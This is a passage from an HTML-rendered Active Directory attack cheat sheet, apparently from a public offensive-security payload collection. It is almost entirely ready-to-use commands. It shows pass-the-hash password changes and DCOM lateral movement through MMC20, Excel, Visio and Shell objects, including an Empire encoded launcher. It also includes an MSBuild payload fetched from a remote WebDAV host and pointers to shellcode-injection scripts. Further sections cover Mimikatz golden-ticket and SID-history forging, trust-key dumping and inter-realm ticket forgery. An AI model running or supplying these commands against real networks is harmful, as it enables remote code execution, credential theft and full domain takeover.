<a id="__codelineno-257-3" name="__codelineno-257-3" href="#__codelineno-257-3"></a>
<a id="__codelineno-257-4" name="__codelineno-257-4" href="#__codelineno-257-4"></a><span class="c1"># Using bloodyAD with pass-the-hash</span>
<a id="__codelineno-257-5" name="__codelineno-257-5" href="#__codelineno-257-5"></a>bloodyAD.py<span class="w"> </span>--host<span class="w"> </span><span class="o">[</span>DC<span class="w"> </span>IP<span class="o">]</span><span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>-u<span class="w"> </span>attacker_user<span class="w"> </span>-p<span class="w"> </span>:B4B9B02E6F09A9BD760F388B67351E2B<span class="w"> </span>changePassword<span class="w"> </span>target_user<span class="w"> </span>target_newpwd
</code></pre></div></li>
</ul>
<h2 id="dcom-exploitation">DCOM Exploitation</h2>
<blockquote>
<p>DCOM is an extension of COM (Component Object Model), which allows applications to instantiate and access the properties and methods of COM objects on a remote computer.</p>
</blockquote>
<ul>
<li>Impacket DCOMExec.py
  <div class="highlight"><pre><span></span><code><a id="__codelineno-258-1" name="__codelineno-258-1" href="#__codelineno-258-1"></a><span class="n">dcomexec</span><span class="p">.</span><span class="n">py</span> <span class="p">[</span><span class="n">-h</span><span class="p">]</span> <span class="p">[</span><span class="n">-share</span> <span class="n">SHARE</span><span class="p">]</span> <span class="p">[</span><span class="n">-nooutput</span><span class="p">]</span> <span class="p">[</span><span class="n">-ts</span><span class="p">]</span> <span class="p">[</span><span class="n">-debug</span><span class="p">]</span> <span class="p">[</span><span class="n">-codec</span> <span class="n">CODEC</span><span class="p">]</span> <span class="p">[</span><span class="n">-object</span> <span class="p">[{</span><span class="n">ShellWindows</span><span class="p">,</span><span class="n">ShellBrowserWindow</span><span class="p">,</span><span class="n">MMC20</span><span class="p">}]]</span> <span class="p">[</span><span class="n">-hashes</span> <span class="n">LMHASH</span><span class="p">:</span><span class="n">NTHASH</span><span class="p">]</span> <span class="p">[</span><span class="n">-no-pass</span><span class="p">]</span> <span class="p">[</span><span class="n">-k</span><span class="p">]</span> <span class="p">[</span><span class="n">-aesKey</span> <span class="n">hex</span> <span class="n">key</span><span class="p">]</span> <span class="p">[</span><span class="n">-dc-ip</span> <span class="n">ip</span> <span class="n">address</span><span class="p">]</span> <span class="p">[</span><span class="n">-A</span> <span class="n">authfile</span><span class="p">]</span> <span class="p">[</span><span class="n">-keytab</span> <span class="n">KEYTAB</span><span class="p">]</span> <span class="n">target</span> <span class="no">[command ...]</span>
<a id="__codelineno-258-2" name="__codelineno-258-2" href="#__codelineno-258-2"></a><span class="n">dcomexec</span><span class="p">.</span><span class="n">py</span> <span class="n">-share</span> <span class="n">C</span><span class="p">$</span> <span class="n">-object</span> <span class="n">MMC20</span> <span class="s1">&#39;&lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;MACHINE_CIBLE&gt;&#39;</span>
<a id="__codelineno-258-3" name="__codelineno-258-3" href="#__codelineno-258-3"></a><span class="n">dcomexec</span><span class="p">.</span><span class="n">py</span> <span class="n">-share</span> <span class="n">C</span><span class="p">$</span> <span class="n">-object</span> <span class="n">MMC20</span> <span class="s1">&#39;&lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;MACHINE_CIBLE&gt;&#39;</span> <span class="s1">&#39;ipconfig&#39;</span>
<a id="__codelineno-258-4" name="__codelineno-258-4" href="#__codelineno-258-4"></a>
<a id="__codelineno-258-5" name="__codelineno-258-5" href="#__codelineno-258-5"></a><span class="n">python3</span> <span class="n">dcomexec</span><span class="p">.</span><span class="n">py</span> <span class="n">-object</span> <span class="n">MMC20</span> <span class="n">-silentcommand</span> <span class="n">-debug</span> <span class="nv">$DOMAIN</span><span class="p">/</span><span class="nv">$USER</span><span class="p">:</span><span class="nv">$PASSWORD</span><span class="p">\$@</span><span class="nv">$HOST</span> <span class="s1">&#39;notepad.exe&#39;</span>
<a id="__codelineno-258-6" name="__codelineno-258-6" href="#__codelineno-258-6"></a><span class="c"># -object MMC20 specifies that we wish to instantiate the MMC20.Application object.</span>
<a id="__codelineno-258-7" name="__codelineno-258-7" href="#__codelineno-258-7"></a><span class="c"># -silentcommand executes the command without attempting to retrieve the output.</span>
</code></pre></div></li>
<li>CheeseTools - https://github.com/klezVirus/CheeseTools
  <div class="highlight"><pre><span></span><code><a id="__codelineno-259-1" name="__codelineno-259-1" href="#__codelineno-259-1"></a><span class="c"># https://klezvirus.github.io/RedTeaming/LateralMovement/LateralMovementDCOM/</span>
<a id="__codelineno-259-2" name="__codelineno-259-2" href="#__codelineno-259-2"></a><span class="n">-t</span><span class="p">,</span> <span class="p">-</span><span class="n">-target</span><span class="p">=</span><span class="n">VALUE</span>         <span class="n">Target</span> <span class="n">Machine</span>
<a id="__codelineno-259-3" name="__codelineno-259-3" href="#__codelineno-259-3"></a><span class="n">-b</span><span class="p">,</span> <span class="p">-</span><span class="n">-binary</span><span class="p">=</span><span class="n">VALUE</span>         <span class="n">Binary</span><span class="p">:</span> <span class="n">powershell</span><span class="p">.</span><span class="n">exe</span>
<a id="__codelineno-259-4" name="__codelineno-259-4" href="#__codelineno-259-4"></a><span class="n">-a</span><span class="p">,</span> <span class="p">-</span><span class="n">-args</span><span class="p">=</span><span class="n">VALUE</span>           <span class="n">Arguments</span><span class="p">:</span> <span class="n">-enc</span> <span class="p">&lt;</span><span class="n">blah</span><span class="p">&gt;</span>
<a id="__codelineno-259-5" name="__codelineno-259-5" href="#__codelineno-259-5"></a><span class="n">-m</span><span class="p">,</span> <span class="p">-</span><span class="n">-method</span><span class="p">=</span><span class="n">VALUE</span>         <span class="n">Methods</span><span class="p">:</span> <span class="n">MMC20Application</span><span class="p">,</span> <span class="n">ShellWindows</span><span class="p">,</span>
<a id="__codelineno-259-6" name="__codelineno-259-6" href="#__codelineno-259-6"></a>                            <span class="n">ShellBrowserWindow</span><span class="p">,</span> <span class="n">ExcelDDE</span><span class="p">,</span> <span class="n">VisioAddonEx</span><span class="p">,</span>
<a id="__codelineno-259-7" name="__codelineno-259-7" href="#__codelineno-259-7"></a>                            <span class="n">OutlookShellEx</span><span class="p">,</span> <span class="n">ExcelXLL</span><span class="p">,</span> <span class="n">VisioExecLine</span><span class="p">,</span> 
<a id="__codelineno-259-8" name="__codelineno-259-8" href="#__codelineno-259-8"></a>                            <span class="n">OfficeMacro</span>
<a id="__codelineno-259-9" name="__codelineno-259-9" href="#__codelineno-259-9"></a><span class="n">-r</span><span class="p">,</span> <span class="p">-</span><span class="n">-reg</span><span class="p">,</span> <span class="p">-</span><span class="n">-registry</span>      <span class="n">Enable</span> <span class="n">registry</span> <span class="n">manipulation</span>
<a id="__codelineno-259-10" name="__codelineno-259-10" href="#__codelineno-259-10"></a><span class="n">-h</span><span class="p">,</span> <span class="p">-?,</span> <span class="p">-</span><span class="n">-help</span>             <span class="n">Show</span> <span class="n">Help</span>
<a id="__codelineno-259-11" name="__codelineno-259-11" href="#__codelineno-259-11"></a>
<a id="__codelineno-259-12" name="__codelineno-259-12" href="#__codelineno-259-12"></a><span class="n">Current</span> <span class="n">Methods</span><span class="p">:</span> <span class="n">MMC20</span><span class="p">.</span><span class="n">Application</span><span class="p">,</span> <span class="n">ShellWindows</span><span class="p">,</span> <span class="n">ShellBrowserWindow</span><span class="p">,</span> <span class="n">ExcelDDE</span><span class="p">,</span> <span class="n">VisioAddonEx</span><span class="p">,</span> <span class="n">OutlookShellEx</span><span class="p">,</span> <span class="n">ExcelXLL</span><span class="p">,</span> <span class="n">VisioExecLine</span><span class="p">,</span> <span class="n">OfficeMacro</span><span class="p">.</span>
</code></pre></div></li>
<li>Invoke-DCOM - https://raw.githubusercontent.com/rvrsh3ll/Misc-Powershell-Scripts/master/Invoke-DCOM.ps1
  <div class="highlight"><pre><span></span><code><a id="__codelineno-260-1" name="__codelineno-260-1" href="#__codelineno-260-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="nb">Invoke-DCOM</span><span class="p">.</span><span class="n">ps1</span>
<a id="__codelineno-260-2" name="__codelineno-260-2" href="#__codelineno-260-2"></a><span class="nb">Invoke-DCOM</span> <span class="n">-ComputerName</span> <span class="s1">&#39;10.10.10.10&#39;</span> <span class="n">-Method</span> <span class="n">MMC20</span><span class="p">.</span><span class="n">Application</span> <span class="n">-Command</span> <span class="s2">&quot;calc.exe&quot;</span>
<a id="__codelineno-260-3" name="__codelineno-260-3" href="#__codelineno-260-3"></a><span class="nb">Invoke-DCOM</span> <span class="n">-ComputerName</span> <span class="s1">&#39;10.10.10.10&#39;</span> <span class="n">-Method</span> <span class="n">ExcelDDE</span> <span class="n">-Command</span> <span class="s2">&quot;calc.exe&quot;</span>
<a id="__codelineno-260-4" name="__codelineno-260-4" href="#__codelineno-260-4"></a><span class="nb">Invoke-DCOM</span> <span class="n">-ComputerName</span> <span class="s1">&#39;10.10.10.10&#39;</span> <span class="n">-Method</span> <span class="n">ServiceStart</span> <span class="s2">&quot;MyService&quot;</span>
<a id="__codelineno-260-5" name="__codelineno-260-5" href="#__codelineno-260-5"></a><span class="nb">Invoke-DCOM</span> <span class="n">-ComputerName</span> <span class="s1">&#39;10.10.10.10&#39;</span> <span class="n">-Method</span> <span class="n">ShellBrowserWindow</span> <span class="n">-Command</span> <span class="s2">&quot;calc.exe&quot;</span>
<a id="__codelineno-260-6" name="__codelineno-260-6" href="#__codelineno-260-6"></a><span class="nb">Invoke-DCOM</span> <span class="n">-ComputerName</span> <span class="s1">&#39;10.10.10.10&#39;</span> <span class="n">-Method</span> <span class="n">ShellWindows</span> <span class="n">-Command</span> <span class="s2">&quot;calc.exe&quot;</span>
</code></pre></div></li>
</ul>
<h3 id="dcom-via-mmc-application-class">DCOM via MMC Application Class</h3>
<p>This COM object (MMC20.Application) allows you to script components of MMC snap-in operations. there is a method named <strong>"ExecuteShellCommand"</strong> under <strong>Document.ActiveView</strong>.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-261-1" name="__codelineno-261-1" href="#__codelineno-261-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nv">$com</span> <span class="p">=</span> <span class="no">[activator]</span><span class="p">::</span><span class="n">CreateInstance</span><span class="p">(</span><span class="no">[type]</span><span class="p">::</span><span class="n">GetTypeFromProgID</span><span class="p">(</span><span class="s2">&quot;MMC20.Application&quot;</span><span class="p">,</span><span class="s2">&quot;10.10.10.1&quot;</span><span class="p">))</span>
<a id="__codelineno-261-2" name="__codelineno-261-2" href="#__codelineno-261-2"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nv">$com</span><span class="p">.</span><span class="n">Document</span><span class="p">.</span><span class="n">ActiveView</span><span class="p">.</span><span class="n">ExecuteShellCommand</span><span class="p">(</span><span class="s2">&quot;C:\Windows\System32\calc.exe&quot;</span><span class="p">,</span><span class="nv">$null</span><span class="p">,</span><span class="nv">$null</span><span class="p">,</span><span class="n">7</span><span class="p">)</span>
<a id="__codelineno-261-3" name="__codelineno-261-3" href="#__codelineno-261-3"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nv">$com</span><span class="p">.</span><span class="n">Document</span><span class="p">.</span><span class="n">ActiveView</span><span class="p">.</span><span class="n">ExecuteShellCommand</span><span class="p">(</span><span class="s2">&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot;</span><span class="p">,</span><span class="nv">$null</span><span class="p">,</span><span class="s2">&quot;-enc DFDFSFSFSFSFSFSFSDFSFSF &lt; Empire encoded string &gt; &quot;</span><span class="p">,</span><span class="s2">&quot;7&quot;</span><span class="p">)</span>
<a id="__codelineno-261-4" name="__codelineno-261-4" href="#__codelineno-261-4"></a>
<a id="__codelineno-261-5" name="__codelineno-261-5" href="#__codelineno-261-5"></a><span class="c"># Weaponized example with MSBuild</span>
<a id="__codelineno-261-6" name="__codelineno-261-6" href="#__codelineno-261-6"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="no">[System.Activator]</span><span class="p">::</span><span class="n">CreateInstance</span><span class="p">(</span><span class="no">[type]</span><span class="p">::</span><span class="n">GetTypeFromProgID</span><span class="p">(</span><span class="s2">&quot;MMC20.Application&quot;</span><span class="p">,</span><span class="s2">&quot;10.10.10.1&quot;</span><span class="p">)).</span><span class="n">Document</span><span class="p">.</span><span class="n">ActiveView</span><span class="p">.</span><span class="n">ExecuteShellCommand</span><span class="p">(</span><span class="s2">&quot;c:\windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe&quot;</span><span class="p">,</span><span class="nv">$null</span><span class="p">,</span><span class="s2">&quot;\\10.10.10.2\webdav\build.xml&quot;</span><span class="p">,</span><span class="s2">&quot;7&quot;</span><span class="p">)</span>
</code></pre></div>
<p>Invoke-MMC20RCE : https://raw.githubusercontent.com/n0tty/powershellery/master/Invoke-MMC20RCE.ps1</p>
<h3 id="dcom-via-office">DCOM via Office</h3>
<ul>
<li>Excel.Application</li>
<li>DDEInitiate</li>
<li>RegisterXLL</li>
<li>Outlook.Application</li>
<li>CreateObject-&gt;Shell.Application-&gt;ShellExecute</li>
<li>CreateObject-&gt;ScriptControl (office-32bit only)</li>
<li>Visio.InvisibleApp (same as Visio.Application, but should not show the Visio window)</li>
<li>Addons</li>
<li>ExecuteLine</li>
<li>Word.Application</li>
<li>RunAutoMacro</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-262-1" name="__codelineno-262-1" href="#__codelineno-262-1"></a><span class="c"># Powershell script that injects shellcode into excel.exe via ExecuteExcel4Macro through DCOM</span>
<a id="__codelineno-262-2" name="__codelineno-262-2" href="#__codelineno-262-2"></a><span class="nb">Invoke-Excel4DCOM64</span><span class="p">.</span><span class="n">ps1</span> <span class="n">https</span><span class="p">://</span><span class="n">gist</span><span class="p">.</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">Philts</span><span class="p">/</span><span class="n">85d0f2f0a1cc901d40bbb5b44eb3b4c9</span>
<a id="__codelineno-262-3" name="__codelineno-262-3" href="#__codelineno-262-3"></a><span class="nb">Invoke-ExShellcode</span><span class="p">.</span><span class="n">ps1</span> <span class="n">https</span><span class="p">://</span><span class="n">gist</span><span class="p">.</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">Philts</span><span class="p">/</span><span class="n">f7c85995c5198e845c70cc51cd4e7e2a</span>
<a id="__codelineno-262-4" name="__codelineno-262-4" href="#__codelineno-262-4"></a>
<a id="__codelineno-262-5" name="__codelineno-262-5" href="#__codelineno-262-5"></a><span class="c"># Using Excel DDE</span>
<a id="__codelineno-262-6" name="__codelineno-262-6" href="#__codelineno-262-6"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nv">$excel</span> <span class="p">=</span> <span class="no">[activator]</span><span class="p">::</span><span class="n">CreateInstance</span><span class="p">(</span><span class="no">[type]</span><span class="p">::</span><span class="n">GetTypeFromProgID</span><span class="p">(</span><span class="s2">&quot;Excel.Application&quot;</span><span class="p">,</span> <span class="s2">&quot;$ComputerName&quot;</span><span class="p">))</span>
<a id="__codelineno-262-7" name="__codelineno-262-7" href="#__codelineno-262-7"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nv">$excel</span><span class="p">.</span><span class="n">DisplayAlerts</span> <span class="p">=</span> <span class="nv">$false</span>
<a id="__codelineno-262-8" name="__codelineno-262-8" href="#__codelineno-262-8"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nv">$excel</span><span class="p">.</span><span class="n">DDEInitiate</span><span class="p">(</span><span class="s2">&quot;cmd&quot;</span><span class="p">,</span> <span class="s2">&quot;/c calc.exe&quot;</span><span class="p">)</span>
<a id="__codelineno-262-9" name="__codelineno-262-9" href="#__codelineno-262-9"></a>
<a id="__codelineno-262-10" name="__codelineno-262-10" href="#__codelineno-262-10"></a><span class="c"># Using Excel RegisterXLL</span>
<a id="__codelineno-262-11" name="__codelineno-262-11" href="#__codelineno-262-11"></a><span class="c"># Can&#39;t be used reliably with a remote target</span>
<a id="__codelineno-262-12" name="__codelineno-262-12" href="#__codelineno-262-12"></a><span class="n">Require</span><span class="p">:</span> <span class="n">reg</span> <span class="n">add</span> <span class="n">HKEY_CURRENT_USER</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Office</span><span class="p">\</span><span class="n">16</span><span class="p">.</span><span class="n">0</span><span class="p">\</span><span class="n">Excel</span><span class="p">\</span><span class="n">Security</span><span class="p">\</span><span class="n">Trusted</span> <span class="n">Locations</span> <span class="p">/</span><span class="n">v</span> <span class="n">AllowsNetworkLocations</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">d</span> <span class="n">1</span>
<a id="__codelineno-262-13" name="__codelineno-262-13" href="#__codelineno-262-13"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="nv">$excel</span> <span class="p">=</span> <span class="no">[activator]</span><span class="p">::</span><span class="n">CreateInstance</span><span class="p">(</span><span class="no">[type]</span><span class="p">::</span><span class="n">GetTypeFromProgID</span><span class="p">(</span><span class="s2">&quot;Excel.Application&quot;</span><span class="p">,</span> <span class="s2">&quot;$ComputerName&quot;</span><span class="p">))</span>
<a id="__codelineno-262-14" name="__codelineno-262-14" href="#__codelineno-262-14"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="nv">$excel</span><span class="p">.</span><span class="n">RegisterXLL</span><span class="p">(</span><span class="s2">&quot;EvilXLL.dll&quot;</span><span class="p">)</span>
<a id="__codelineno-262-15" name="__codelineno-262-15" href="#__codelineno-262-15"></a>
<a id="__codelineno-262-16" name="__codelineno-262-16" href="#__codelineno-262-16"></a><span class="c"># Using Visio</span>
<a id="__codelineno-262-17" name="__codelineno-262-17" href="#__codelineno-262-17"></a><span class="nv">$visio</span> <span class="p">=</span> <span class="no">[activator]</span><span class="p">::</span><span class="n">CreateInstance</span><span class="p">(</span><span class="no">[type]</span><span class="p">::</span><span class="n">GetTypeFromProgID</span><span class="p">(</span><span class="s2">&quot;Visio.InvisibleApp&quot;</span><span class="p">,</span> <span class="s2">&quot;$ComputerName&quot;</span><span class="p">))</span>
<a id="__codelineno-262-18" name="__codelineno-262-18" href="#__codelineno-262-18"></a><span class="nv">$visio</span><span class="p">.</span><span class="n">Addons</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="s2">&quot;C:\Windows\System32\cmd.exe&quot;</span><span class="p">).</span><span class="n">Run</span><span class="p">(</span><span class="s2">&quot;/c calc&quot;</span><span class="p">)</span>
</code></pre></div>
<h3 id="dcom-via-shellexecute">DCOM via ShellExecute</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-263-1" name="__codelineno-263-1" href="#__codelineno-263-1"></a><span class="nv">$com</span> <span class="p">=</span> <span class="no">[Type]</span><span class="p">::</span><span class="n">GetTypeFromCLSID</span><span class="p">(</span><span class="s1">&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;</span><span class="p">,</span><span class="s2">&quot;10.10.10.1&quot;</span><span class="p">)</span>
<a id="__codelineno-263-2" name="__codelineno-263-2" href="#__codelineno-263-2"></a><span class="nv">$obj</span> <span class="p">=</span> <span class="no">[System.Activator]</span><span class="p">::</span><span class="n">CreateInstance</span><span class="p">(</span><span class="nv">$com</span><span class="p">)</span>
<a id="__codelineno-263-3" name="__codelineno-263-3" href="#__codelineno-263-3"></a><span class="nv">$item</span> <span class="p">=</span> <span class="nv">$obj</span><span class="p">.</span><span class="n">Item</span><span class="p">()</span>
<a id="__codelineno-263-4" name="__codelineno-263-4" href="#__codelineno-263-4"></a><span class="nv">$item</span><span class="p">.</span><span class="n">Document</span><span class="p">.</span><span class="n">Application</span><span class="p">.</span><span class="n">ShellExecute</span><span class="p">(</span><span class="s2">&quot;cmd.exe&quot;</span><span class="p">,</span><span class="s2">&quot;/c calc.exe&quot;</span><span class="p">,</span><span class="s2">&quot;C:\windows\system32&quot;</span><span class="p">,</span><span class="nv">$null</span><span class="p">,</span><span class="n">0</span><span class="p">)</span>
</code></pre></div>
<h3 id="dcom-via-shellbrowserwindow">DCOM via ShellBrowserWindow</h3>
<p><img alt="⚠" class="twemoji" src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/svg/26a0.svg" title=":warning:" /> Windows 10 only, the object doesn't exists in Windows 7</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-264-1" name="__codelineno-264-1" href="#__codelineno-264-1"></a><span class="nv">$com</span> <span class="p">=</span> <span class="no">[Type]</span><span class="p">::</span><span class="n">GetTypeFromCLSID</span><span class="p">(</span><span class="s1">&#39;C08AFD90-F2A1-11D1-8455-00A0C91F3880&#39;</span><span class="p">,</span><span class="s2">&quot;10.10.10.1&quot;</span><span class="p">)</span>
<a id="__codelineno-264-2" name="__codelineno-264-2" href="#__codelineno-264-2"></a><span class="nv">$obj</span> <span class="p">=</span> <span class="no">[System.Activator]</span><span class="p">::</span><span class="n">CreateInstance</span><span class="p">(</span><span class="nv">$com</span><span class="p">)</span>
<a id="__codelineno-264-3" name="__codelineno-264-3" href="#__codelineno-264-3"></a><span class="nv">$obj</span><span class="p">.</span><span class="n">Application</span><span class="p">.</span><span class="n">ShellExecute</span><span class="p">(</span><span class="s2">&quot;cmd.exe&quot;</span><span class="p">,</span><span class="s2">&quot;/c calc.exe&quot;</span><span class="p">,</span><span class="s2">&quot;C:\windows\system32&quot;</span><span class="p">,</span><span class="nv">$null</span><span class="p">,</span><span class="n">0</span><span class="p">)</span>
</code></pre></div>
<h2 id="trust-relationship-between-domains">Trust relationship between domains</h2>
<ul>
<li>One-way</li>
<li>Domain B trusts A</li>
<li>Users in Domain A can access resources in Domain B</li>
<li>Users in Domain B cannot access resources in Domain A</li>
<li>Two-way</li>
<li>Domain A trusts Domain B</li>
<li>Domain B trusts Domain A</li>
<li>Authentication requests can be passed between the two domains in both directions</li>
</ul>
<h3 id="enumerate-trusts-between-domains">Enumerate trusts between domains</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-265-1" name="__codelineno-265-1" href="#__codelineno-265-1"></a><span class="n">nltest</span> <span class="p">/</span><span class="n">trusted_domains</span>
</code></pre></div>
<p>or</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-266-1" name="__codelineno-266-1" href="#__codelineno-266-1"></a><span class="p">(</span><span class="no">[System.DirectoryServices.ActiveDirectory.Domain]</span><span class="p">::</span><span class="n">GetCurrentDomain</span><span class="p">()).</span><span class="n">GetAllTrustRelationships</span><span class="p">()</span>
<a id="__codelineno-266-2" name="__codelineno-266-2" href="#__codelineno-266-2"></a>
<a id="__codelineno-266-3" name="__codelineno-266-3" href="#__codelineno-266-3"></a><span class="n">SourceName</span>          <span class="n">TargetName</span>                    <span class="n">TrustType</span>      <span class="n">TrustDirection</span>
<a id="__codelineno-266-4" name="__codelineno-266-4" href="#__codelineno-266-4"></a><span class="p">----------</span>          <span class="p">----------</span>                    <span class="p">---------</span>      <span class="p">--------------</span>
<a id="__codelineno-266-5" name="__codelineno-266-5" href="#__codelineno-266-5"></a><span class="n">domainA</span><span class="p">.</span><span class="n">local</span>      <span class="n">domainB</span><span class="p">.</span><span class="n">local</span>                  <span class="n">TreeRoot</span>       <span class="n">Bidirectional</span>
</code></pre></div>
<h3 id="exploit-trusts-between-domains">Exploit trusts between domains</h3>
<p><img alt="⚠" class="twemoji" src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/svg/26a0.svg" title=":warning:" /> Require a Domain-Admin level access to the current domain.</p>
<table>
<thead>
<tr>
<th>Source</th>
<th>Target</th>
<th>Technique to use</th>
<th>Trust relationship</th>
</tr>
</thead>
<tbody>
<tr>
<td>Root</td>
<td>Child</td>
<td>Golden Ticket + Enterprise Admin group (Mimikatz /groups)</td>
<td>Inter Realm (2-way)</td>
</tr>
<tr>
<td>Child</td>
<td>Child</td>
<td>SID History exploitation (Mimikatz /sids)</td>
<td>Inter Realm Parent-Child (2-way)</td>
</tr>
<tr>
<td>Child</td>
<td>Root</td>
<td>SID History exploitation (Mimikatz /sids)</td>
<td>Inter Realm Tree-Root (2-way)</td>
</tr>
<tr>
<td>Forest A</td>
<td>Forest B</td>
<td>PrinterBug + Unconstrained delegation ?</td>
<td>Inter Realm Forest or External (2-way)</td>
</tr>
</tbody>
</table>
<h2 id="child-domain-to-forest-compromise-sid-hijacking">Child Domain to Forest Compromise - SID Hijacking</h2>
<p>Most trees are linked with dual sided trust relationships to allow for sharing of resources.
By default the first domain created if the Forest Root.</p>
<p><strong>Requirements</strong>: 
- KRBTGT Hash
- Find the SID of the domain
    <div class="highlight"><pre><span></span><code><a id="__codelineno-267-1" name="__codelineno-267-1" href="#__codelineno-267-1"></a><span class="p">$</span> <span class="nb">Convert-NameToSid</span> <span class="n">target</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">com</span><span class="p">\</span><span class="n">krbtgt</span>
<a id="__codelineno-267-2" name="__codelineno-267-2" href="#__codelineno-267-2"></a><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">2941561648</span><span class="p">-</span><span class="n">383941485</span><span class="p">-</span><span class="n">1389968811</span><span class="p">-</span><span class="n">502</span>
<a id="__codelineno-267-3" name="__codelineno-267-3" href="#__codelineno-267-3"></a>
<a id="__codelineno-267-4" name="__codelineno-267-4" href="#__codelineno-267-4"></a><span class="c"># with Impacket</span>
<a id="__codelineno-267-5" name="__codelineno-267-5" href="#__codelineno-267-5"></a><span class="n">lookupsid</span><span class="p">.</span><span class="n">py</span> <span class="n">domain</span><span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">password</span><span class="nv">@10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span>
</code></pre></div>
- Replace 502 with 519 to represent Enterprise Admins
- Create golden ticket and attack parent domain. 
    <div class="highlight"><pre><span></span><code><a id="__codelineno-268-1" name="__codelineno-268-1" href="#__codelineno-268-1"></a><span class="n">kerberos</span><span class="p">::</span><span class="n">golden</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">krbtgt</span><span class="p">:</span><span class="n">HASH_KRBTGT</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">sid</span><span class="p">:</span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">2941561648</span><span class="p">-</span><span class="n">383941485</span><span class="p">-</span><span class="n">1389968811</span> <span class="p">/</span><span class="n">sids</span><span class="p">:</span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5-SID-SECOND-DOMAIN</span><span class="p">-</span><span class="n">519</span> <span class="p">/</span><span class="n">ptt</span>
</code></pre></div></p>
<h2 id="forest-to-forest-compromise-trust-ticket">Forest to Forest Compromise - Trust Ticket</h2>
<ul>
<li>Require: SID filtering disabled</li>
</ul>
<p>From the DC, dump the hash of the <code>currentdomain\targetdomain$</code> trust account using Mimikatz (e.g. with LSADump or DCSync). Then, using this trust key and the domain SIDs, forge an inter-realm TGT using 
Mimikatz, adding the SID for the target domain's enterprise admins group to our <strong>SID history</strong>.</p>
<h3 id="dumping-trust-passwords-trust-keys">Dumping trust passwords (trust keys)</h3>
<blockquote>
<p>Look for the trust name with a dollar ($) sign at the end. Most of the accounts with a trailing <strong>$</strong> are computer accounts, but some are trust accounts.</p>
</blockquote>
<div class="highlight"><pre><span></span><code><a id="__codelineno-269-1" name="__codelineno-269-1" href="#__codelineno-269-1"></a><span class="n">lsadump</span><span class="p">::</span><span class="n">trust</span> <span class="p">/</span><span class="n">patch</span>
<a id="__codelineno-269-2" name="__codelineno-269-2" href="#__codelineno-269-2"></a>
<a id="__codelineno-269-3" name="__codelineno-269-3" href="#__codelineno-269-3"></a><span class="n">or</span> <span class="n">find</span> <span class="n">the</span> <span class="n">TRUST_NAME</span><span class="p">$</span> <span class="n">machine</span> <span class="n">account</span> <span class="n">hash</span>
</code></pre></div>
<h3 id="create-a-forged-trust-ticket-inter-realm-tgt-using-mimikatz">Create a forged trust ticket (inter-realm TGT) using Mimikatz</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-270-1" name="__codelineno-270-1" href="#__codelineno-270-1"></a><span class="n">mimikatz</span><span class="p">(</span><span class="n">commandline</span><span class="p">)</span> <span class="c"># kerberos::golden /domain:domain.local /sid:S-1-5-21... /rc4:HASH_TRUST$ /user:Administrator /service:krbtgt /target:external.com /ticket:c:\temp\trust.kirbi</span>
<a id="__codelineno-270-2" name="__codelineno-270-2" href="#__codelineno-270-2"></a><span class="n">mimikatz</span><span class="p">(</span><span class="n">commandline</span><span class="p">)</span> <span class="c"># kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:c:\ad\tools\mcorp-ticket.kirbi</span>
</code></pre></div>
<h3 id="use-the-trust-ticket-file-to-get-a-st-for-the-targeted-service">Use the Trust Ticket file to get a ST for the targeted service</h3>
